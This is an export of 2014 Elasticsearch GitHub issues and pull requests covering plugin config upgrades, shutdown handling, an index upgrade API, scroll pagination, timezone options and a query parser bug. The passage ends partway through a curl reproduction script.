</comment><comment author="dadoonet" created="2014-09-29T09:54:01Z" id="57139189">After talking with @spinscale, it's actually a bad idea to move old configuration files to an old place. Because after an update, plugins will fallback to default plugin configuration instead of keeping the right configuration in place.

So, let's do the opposite:
- 1st step: during an install, if we detect already existing `config/pluginname` directory, we copy plugin ZIP file content in `config/pluginname.new`.
- 2nd step: could be within the same PR or in a new one, we do the same thing but file by file; it means that we copy all non existing files from the plugin to `config/pluginname` but each time a file already exists, we simply copy the new file to the same dir but we append a `.new` at the end.

This 2nd step requires more work and more tests so it could be part of a second PR after 1.4.0.Beta1 has been released (target 1.4.0).

Comments?
</comment><comment author="pickypg" created="2014-09-29T16:09:07Z" id="57184984">I completely agree. That makes perfect sense, and it should make it a lot easier to understand what has changed.

It does make me wonder if this is simple enough behavior to allow without user interaction or plugin interaction (enabled transformation of the configuration from within the plugin when upgrading, a la logstash transformation). As it stands -- no matter what -- _some_ plugin will break from any of the three proposed solutions.

For 1.4.0.Beta1, we really need to be sure that we show red flags if we leave any `.new` files in the config directory. As long as we do that, then I am happy.
</comment><comment author="dadoonet" created="2014-09-30T10:15:48Z" id="57293160">Small update on this. I will send in a couple of hours an update which basically only copy files when they does not exist in `config/pluginname` dir or append a `.new` before copying when another one already exist.

Working fine so far. Just need to update the test case.
</comment><comment author="dadoonet" created="2014-09-30T11:57:54Z" id="57302596">It's now ready for review. @spinscale Wanna look?
</comment><comment author="spinscale" created="2014-10-01T06:51:30Z" id="57425575">did a quick review. Is there consensus now, that the `.new` suffix/impl is good for our purposes?
Still thinking that just returning a log line is valid as well... (you never need to worry, if someone changed the `.new` after plugin installation and doesnt want it to be overwritten, for example)
</comment><comment author="dadoonet" created="2014-10-04T11:30:16Z" id="57902091">@spinscale I pushed a new commit. Could you check it please?
</comment><comment author="dadoonet" created="2014-10-06T19:42:15Z" id="58081856">@pickypg Do you agree as well with what was done within this PR? Thanks for your feedback. cc @spinscale 
</comment><comment author="pickypg" created="2014-10-06T21:08:00Z" id="58099089">Minor comment. Agree with the PR! LGTM
</comment><comment author="dadoonet" created="2014-10-06T21:49:43Z" id="58105586">@pickypg @spinscale I updated based on latest comment, rebased my work on master and force pushed to my branch. My plan is to merge it tomorrow morning around 10AM CET after running all tests again.

Let me know if you think something is wrong with this PR.

Thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NodesFD: simplify concurrency control to fully rely on a single map</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7889</link><project id="" key="" /><description>The node fault detection class is used by the master node to ping the nodes in the cluster and verify they are alive. This PR simplifies the concurrency controls in the class + adds a test for a scenario that surfaced the problem.
</description><key id="44024642">7889</key><summary>NodesFD: simplify concurrency control to fully rely on a single map</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T08:22:20Z</created><updated>2015-06-07T12:00:26Z</updated><resolved>2014-09-26T09:23:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>fix mismatched curly bracket</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7888</link><project id="" key="" /><description /><key id="43982594">7888</key><summary>fix mismatched curly bracket</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">hangsu</reporter><labels><label>docs</label></labels><created>2014-09-26T00:10:00Z</created><updated>2014-10-14T11:24:58Z</updated><resolved>2014-10-14T11:24:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T17:23:29Z" id="57349544">Hi @hangsu 

thanks for the fix. please could i ask you to sign the CLA so that I can merge this in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="hangsu" created="2014-09-30T19:01:29Z" id="57364748">@clintongormley Done!
</comment><comment author="clintongormley" created="2014-10-14T11:24:58Z" id="59027807">Merged, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update indexes settings during a Snapshot restore</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7887</link><project id="" key="" /><description>It could be usefull to have a way to update settings during a restore snapshot. For example, you can set replica to 0 when restoring a snapshot on a "dev" environment.
</description><key id="43979611">7887</key><summary>Update indexes settings during a Snapshot restore</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">ghoumard</reporter><labels><label>:Snapshot/Restore</label><label>enhancement</label></labels><created>2014-09-25T23:21:14Z</created><updated>2015-01-20T21:10:24Z</updated><resolved>2015-01-20T21:10:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T17:21:47Z" id="57349297">@imotov what do you think?
</comment><comment author="imotov" created="2014-09-30T17:40:59Z" id="57352245">@clintongormley sounds reasonable, but we need to think about proper interface for that
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Optimize with `flush=true` only works when `wait_for_merges=true`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7886</link><project id="" key="" /><description>The implementation of optimize currently has a conditional flush before doing the `forceMerge`, as well as a conditional flush afterwards.  However, if `wait_for_merges=false`, the second flush is bogus.  It should occur once the force merge is complete. 
</description><key id="43979473">7886</key><summary>Optimize with `flush=true` only works when `wait_for_merges=true`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T23:19:17Z</created><updated>2014-09-30T18:16:37Z</updated><resolved>2014-09-29T22:27:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-26T16:04:45Z" id="56982200">Nice catch!  It's silly to do that 2nd flush if we didn't wait ...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make close() synchronized during node shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7885</link><project id="" key="" /><description>An example scenario where this will help:

When the node is shutdown via api call, for example
(https://github.com/elasticsearch/elasticsearch/blob/master/src/test/java/org/elasticsearch/test/ExternalNode.java#L219 )
then the call returns immediately even if the node is not actually shutdown yet
(https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/action/admin/cluster/node/shutdown/TransportNodesShutdownAction.java#L226).
If at the same time the proces is killed, then the hook that would usually prevent
uncontrolled shutdown
(https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/bootstrap/Bootstrap.java#L75)
has no effect: It again calls close() which might then just return
for example because one of the lifecycles was moved to closed already.

The bwc test FunctionScoreBackwardCompatibilityTests.testSimpleFunctionScoreParsingWorks
failed because of this. The translog was not properly
written because if the shutdown was called via api, the following process.destroy()
(https://github.com/elasticsearch/elasticsearch/blob/master/src/test/java/org/elasticsearch/test/ExternalNode.java#L225)
killed the node before the translog was written to disk.
</description><key id="43973585">7885</key><summary>Make close() synchronized during node shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Internal</label><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T22:04:30Z</created><updated>2015-06-07T18:21:01Z</updated><resolved>2014-09-26T11:05:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-26T09:18:05Z" id="56938276">LGTM - left one minor comment
</comment><comment author="brwe" created="2014-09-26T10:34:49Z" id="56945346">comment added. may I push?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Provide api to upgrade lucene indexes to current version</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7884</link><project id="" key="" /><description>Lucene currently maintains backwards compatibility for reading the current and previous major version's indexes. When ES 2.0 is eventually released with Lucene 5.0, it will no longer support reading 3.x indexes (ES versions prior to 0.90).  Today, when updating to a later version of ES, if the indexes used are static (e.g. time series data that is archived), the index format is not upgraded.  (Only when there are enough updates to the old segments that trigger a merge to occur would they be rewritten). Therefore a user may be running on the newest version of ES, but still have very old Lucene indexes.

This issue is to add a new _upgrade api, which will force upgrade all index segments that are on versions older than the latest format.

The API would have the ability to trigger and monitor upgrades.  For example, to check the how much
of an index is upgraded:

```
GET /myindex/_upgrade
{
    "myindex" : {
        "size_in_bytes": 12345678,
        "size_to_upgrade_in_bytes": 50000
    }
}
```

And to begin an upgrade:

```
POST /myindex/_upgrade
{
    "_shards": {
        "total": 10,
        "successful": 5,
        "failed":0
    }
}
```
</description><key id="43967930">7884</key><summary>Provide api to upgrade lucene indexes to current version</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>blocker</label><label>feature</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T21:11:09Z</created><updated>2014-10-07T15:13:15Z</updated><resolved>2014-10-07T15:13:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Proper Debian repository</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7883</link><project id="" key="" /><description>Hi,

I've been using Elasticsearch in production for a couple of years, a various Debian (stable) servers.

I really appreciate having a .deb available on your website, and I've cooked myself a small script to upgrade when a new version is released.

It would be even more awesome if you had [a proper Debian repository](https://wiki.debian.org/HowToSetupADebianRepository) set up. We'd have to add it in our `sources.list` file and upgrading would be even easier than it is now.

I'm not familiar with the amount of work necessary for setting up such a repository, but I'm pretty sure all your Debian and Ubuntu users would be pleased and a few of them might even offer help.

I hope you won't file this in the "Unfulfilled Promises and Broken Dreams" [category](https://github.com/rubygems/rubygems/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22Unfulfilled+Promises+and+Broken+Dreams%22).

Thanks a ton for making Elasticsearch et al.
</description><key id="43966788">7883</key><summary>Proper Debian repository</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">jlecour</reporter><labels><label>feedback_needed</label></labels><created>2014-09-25T21:00:09Z</created><updated>2015-02-28T04:50:20Z</updated><resolved>2015-02-28T04:50:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uschindler" created="2014-09-29T18:44:50Z" id="57208479">Is this not enough to do?

```
# cat /etc/apt/sources.list.d/elasticsearch.list
deb http://packages.elasticsearch.org/elasticsearch/1.3/debian stable main
```
</comment><comment author="nik9000" created="2014-09-29T18:53:36Z" id="57209767">Folks have complained about the 1.3 being in the repository and not in the name of the package which is more standard.  But what Elasticsearch has now is fine - we import the repository and validate the hash and stuff.  It works well.
</comment><comment author="clintongormley" created="2014-10-14T11:45:33Z" id="59029759">Hi @jlecour 

Apologies, as I don't know much about deb repositories.  But what part are we missing? 

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/setup-repositories.html#_apt
</comment><comment author="jlecour" created="2014-10-14T12:31:17Z" id="59034906">I'm passing your response to the sysadmin people I'm working with and will transmit their feedback.
</comment><comment author="clintongormley" created="2014-11-08T16:41:12Z" id="62264251">hi @jlecour 

Any more info here?
</comment><comment author="clintongormley" created="2015-02-28T04:50:20Z" id="76510536">Closing this issue for now.  Feel free to reopen if you want to revive this topic
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Tests: let Lucene's MockDirectoryWrapper.close run CheckIndex when shard is closed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7882</link><project id="" key="" /><description>Spinoff from #7730: today, we wrap with MockDirectoryWrapper the directories under DistributedDirectory, but this means we have to do "special things" to get Lucene's CheckIndex to run when a shard is closed.

I think instead we should wrap above DistributorDirectory (somehow)?  Then MockDirectoryWrapper.close would check the index for us ...
</description><key id="43965108">7882</key><summary>Tests: let Lucene's MockDirectoryWrapper.close run CheckIndex when shard is closed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels /><created>2014-09-25T20:44:02Z</created><updated>2014-11-18T09:55:04Z</updated><resolved>2014-11-18T09:55:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Allow search requests to run on an older version of the index</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7881</link><project id="" key="" /><description>When the user does a query and enables scroll it returns back a data set (with from / size set in query) and a scroll id.  However when you search on that scroll id it doesn't allow you to use from / size (size is equal to the original query size and you can't use from on the data set).  Instead it just pages to the next (size) number of results until the array is empty.

My issue comes from a setup where elasticsearch is ingesting data in real time so re-doing the query with from / size every time for pagination can return different results for the same page.  It would be nice to see (from) implemented in the scroll api so the user can just grab a specific range of results from the original scroll request for pagination purposes.
</description><key id="43961007">7881</key><summary>Allow search requests to run on an older version of the index</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Pharmerino</reporter><labels><label>discuss</label></labels><created>2014-09-25T20:04:24Z</created><updated>2014-11-28T11:40:07Z</updated><resolved>2014-11-28T11:40:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-30T16:42:02Z" id="57343555">Hi @Pharmerino 

The idea behind scrolling is that, when you start a search, you get a snapshot of the index at that time.  You keep pulling results until you're done, or there are no more results.

But this doesn't have anything to do with pagination. Why are you trying to use pagination with scroll?  
</comment><comment author="Pharmerino" created="2014-09-30T22:13:26Z" id="57391495">I put this in under scroll because it has the closest functionality of what I need.

I have a setup where I need to query and receive back a fairly large data-set.  Then set up pagination within that data set (i.e. only display 100 results at a time for each page etc).  The issue is, the return data is large enough to where we can't really keep the whole set in memory, and sorting the whole amount of data each time you query, just to get a set number of results at large "from" values will be taxing on the ES server as well.

So in my effort to fix this I noticed two things that were similar to the functionality I require.  One of those is a filter with caching.  This would just about be perfect except the setup will constantly be ingesting data and if those newly indexed items fall within that data set instead of at the end, the page (i.e. from--size) could potentially be different.  That's where scroll came in.  It, as you said, stores a snapshot of the index at that time which is exactly what I need.  Only I can't offset what I want back (i.e. start from a certain point) because it always returns the next "size" worth of data until the return set is empty.

Hopefully this cleared up my issue and feel free to ask any other information of me.
</comment><comment author="clintongormley" created="2014-10-14T13:55:54Z" id="59047918">OK - so what you are after (more or less) is a persistent read-only view of an index at a point in time.  You want to be able to run normal search requests on an older version of the index, eg to give a single user a consistent view during their session.

This could end up using an enormous number of file handles, but may be an interesting idea.  I'll put this up for discussion.
</comment><comment author="markharwood" created="2014-11-28T11:40:06Z" id="64885294">While it is technically possible for Lucene to provide simultaneous access to multiple readers, each with a different point in time, in practice it can be resource-intensive (disk, memory, file handles) to provide this capability, especially if there are a large number of users who may require views held open for lengthy periods. An added concern is that in a distributed system where replicas can diverge (not necessarily in content but in how documents are physically organised into Lucene segments) it would not be possible to maintain a point-in-time view that could be migrated over if there was a change in the choice of replica used to service the user's request (e.g. due to an outage).  For these reasons it's not a feature that we would feel comfortable offering as a part of the standard search API.

An alternative way of achieving your goals may be to use a filter on a timestamp field as part of the user search to lock-down the time-range of records under consideration. This would work if your index only has additions rather than updates or deletes which would obviously change the items being considered
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add timezone setting for query_string</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7880</link><project id="" key="" /><description>The timezone addition to DSL for range query/filter is great ! (https://github.com/elasticsearch/elasticsearch/pull/7113).  The Lucene standard query parser appears to support setTimeZone so maybe there is a way for us to expose that as an option when using query_string? 
</description><key id="43955218">7880</key><summary>Add timezone setting for query_string</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">ppf2</reporter><labels /><created>2014-09-25T19:08:15Z</created><updated>2014-10-20T17:35:41Z</updated><resolved>2014-10-20T17:35:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="ppf2" created="2014-09-25T22:20:50Z" id="56892861">Actually looks like we can specify timezone offset directly in the query_string:
start_date:[\* TO 2014-09-22T23:59:59+02:00]
</comment><comment author="dadoonet" created="2014-09-26T09:26:06Z" id="56939043">Still, I think that end user need in that case to know this syntax and that all dates has been entered previously with this timezone.

I think it might be a good option that the developer set the `timezone` in the query, so user only need to think about dates and enter in its interface something like `date:[* TO 2014]` and that's it.

Behind the scene, it will end up with a query like:

``` json
{
"query": {
  "query_string": {
    "text": "date:[* TO 2014]",
    "timezone": "GMT+1"
  } 
 }
}
```
</comment><comment author="ppf2" created="2014-09-26T16:28:51Z" id="56985334">Agreed :) having a separate timezone option will also provide consistency with the DSL implementation.
</comment><comment author="fterrier" created="2014-10-02T09:25:52Z" id="57603942">+1 here, we would like to get the ES clients to use date:[\* TO 2014-10-01] without having to worry about any timezone.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] create randomly bogus indices in #indexRandom(...)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7879</link><project id="" key="" /><description>This commit randomly adds bogus indices to trigger shard relocations
during indexing including primary relocations to ensure we behave
correctly if that happens.
</description><key id="43954839">7879</key><summary>[TEST] create randomly bogus indices in #indexRandom(...)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>won't fix</label></labels><created>2014-09-25T19:05:01Z</created><updated>2015-03-20T21:53:22Z</updated><resolved>2015-03-20T21:53:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-25T21:05:41Z" id="56883863">LGTM
</comment><comment author="s1monw" created="2015-03-20T21:53:05Z" id="84163911">I think this will cause a lot of problems due to relocating shards - not sure if it's worth it?
</comment><comment author="s1monw" created="2015-03-20T21:53:13Z" id="84163948">closing for now
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added graceful shutdown behaviour</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7878</link><project id="" key="" /><description>We at Crate recently implemented a procedure to gracefully stop nodes moving shards away before finally shutting down in order keep all the data available.
This can be used to perform a rolling upgrade of the cluster **with strong data availability guarantees**.

We've also seen, that there were already some discussions about how to implement that in ES here: https://github.com/elasticsearch/elasticsearch/issues/4248

This PR contains the following changes:
- added new settings called:
  `cluster.graceful_stop.min_availability`, 
  `cluster.graceful_stop.reallocate`, 
  `cluster.graceful_stop.timeout`, 
  `cluster.graceful_stop.force` 
  to control the shutdown behaviour
  (documented here: https://crate.io/docs/en/latest/configuration.html#graceful-stop)
- added signal handling to perform a graceful shutdown on receiving the `USR2` signal (the current implementation depends on classes that are only available in the oracle and openjdk VMs)
- added DISABLED state for `LifecycleComponent` and transition methods

The shutdown process works as follows:
1. after sending graceful shutdown signal, all services of InternalNode will be disabled, the current implementation only rejects new HTTP requests on this node as transport connections are usually steady connections
2. depending on the graceful_stop settings listed above the node will deallocate its shards using the AllShardsDeallocator/PrimariesDeallocator classes
3. node shuts down once de-/reallocation is finished or returns back to its prior state on any error (if `cluster.graceful_stop.force` is not set to true)
</description><key id="43954511">7878</key><summary>Added graceful shutdown behaviour</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">chaudum</reporter><labels><label>review</label></labels><created>2014-09-25T19:02:05Z</created><updated>2016-03-08T15:27:33Z</updated><resolved>2016-03-08T15:27:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-02T20:23:51Z" id="57699141">@chaudum I it will take time to review this and to move it in I think it's valuable and we should consider it but give the size of the change it will take time so please be patient 
</comment><comment author="mfelsche" created="2014-11-27T14:03:12Z" id="64793793">i just rebased this branch against the current master and incorporated some minor changes.
</comment><comment author="clintongormley" created="2016-03-08T15:27:33Z" id="193823876">Hi @chaudum 

Sorry it has been so long.  Given the changes that have happened with sync flush and fast restarts, and the fact that you can use the APIs to migrate data away from a node that is being shut down should you so choose, I don't think this change is one we want to merge.

thanks anyway
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Logstash - Elasticsearch output - No way to specify parent id for parent-child mapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7877</link><project id="" key="" /><description>Looking for a way to use Logstash such that I can specify parent id in the case of parent/child types. I also looked at using custom index mapping, but unlike _route, there is no way to specify a "path" from the indexed document that could reference the parent id. This would be a good feature I think.
</description><key id="43945535">7877</key><summary>Logstash - Elasticsearch output - No way to specify parent id for parent-child mapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikechack</reporter><labels /><created>2014-09-25T17:34:58Z</created><updated>2014-09-29T17:47:15Z</updated><resolved>2014-09-29T17:47:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikechack" created="2014-09-25T17:47:54Z" id="56856506">A reasonable enhancement might be to use the _route path element as the parent id, if parent is specified. If I used route path in this case today, the PUT operation works but it doesn't get associated with the parent.
</comment><comment author="clintongormley" created="2014-09-29T17:47:15Z" id="57199804">Hi @mikechack 

I suggest that you open an issue on https://github.com/elasticsearch/logstash/issues instead

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix NumberFormatException in Simple Query String Query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7876</link><project id="" key="" /><description>Incorrect usage of XContentParser.hasTextCharacters() can result in NumberFormatException as well as other possible issues in template query parser and phrase suggest parsers.

Fixes #7875
</description><key id="43939560">7876</key><summary>Fix NumberFormatException in Simple Query String Query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:Query DSL</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-25T16:35:14Z</created><updated>2015-06-08T00:18:36Z</updated><resolved>2014-09-26T07:53:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-09-25T16:39:35Z" id="56846748">LGTM!
</comment><comment author="s1monw" created="2014-09-25T19:13:17Z" id="56868754">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>simple_query_string parser may fail with NumberFormatException while parsing flags</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7875</link><project id="" key="" /><description>To reproduce:

```
curl -XDELETE 'http://localhost:9200/test/?pretty'

curl -XPUT 'http://localhost:9200/test/?pretty' -d '{
  "settings": {
    "index.number_of_shards": 1
  },
  "mappings": {
    "document": {
      "_routing" : {
        "required": true
      },
      "properties": {
        "title": {
          "type": "string"
    }
      }
    },
    "entity": {
      "_parent": {
        "type": "document"
      },
      "_routing" : {
        "required": true
      },
      "properties": {
        "body": {
          "type": "string"
        }
      }
    }
  }
}'


curl -XPOST 'http://localhost:9200/_bulk?pretty' --data-binary '
{"index": {"_index": "test", "_type": "document", "_id" : "1", "_routing": "1"}}
{"title": "New document"}
{"index": {"_index": "test", "_type": "entity", "_id" : "1", "_routing": "1", "_parent": "1"}}
{"body": "document body"}
'
curl -XPOST 'http://localhost:9200/test/_refresh?pretty'
curl -XGET 'http://localhost:9200/test/document/_search?pretty' -d '
{
  "query" : {
    "bool": {
      "minimum_should_match": 1,
      "disable_coord": true,
      "should": [
        {
          "simple_query_string": {
            "query": "old document",
            "default_operator": "and",
            "fields": ["title^10"],
            "flags": "NONE"
          }
        },
        {
          "has_child": {
            "query": {
              "bool": {
                "minimum_should_match": 1,
